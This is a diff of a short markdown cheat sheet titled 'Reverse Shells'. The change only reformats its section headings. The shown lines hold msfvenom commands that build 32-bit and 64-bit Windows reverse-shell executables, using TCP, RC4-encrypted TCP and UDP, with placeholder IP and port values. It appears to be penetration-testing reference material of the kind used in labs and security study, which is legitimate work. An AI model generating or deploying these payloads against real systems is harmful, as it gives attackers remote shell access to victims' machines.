@@ -1,6 +1,6 @@
 # Reverse Shells
 
-1. x86 (32-bit) Payloads
+## 01 - x86 (32-bit) Payloads
 
 ```
 $ msfvenom -p windows/shell/reverse_tcp lhost=<IP> lport=<PORT> -f exe -o shell-x86.exe
@@ -10,7 +10,7 @@ $ msfvenom -p windows/shell/reverse_tcp_rc4 lhost=<IP> lport=<PORT> rc4password=
 $ msfvenom -p windows/shell/reverse_udp lhost=<IP> lport=<PORT> -f exe -o shell-x86.exe
 ```
 
-2. x86_64 (64-bit) Payloads
+## 02 - x86-64 (64-bit) Payloads
 
 ```
 $ msfvenom -p windows/x64/shell/reverse_tcp lhost=<IP> lport=<PORT> -f exe -o shell-x64.exe
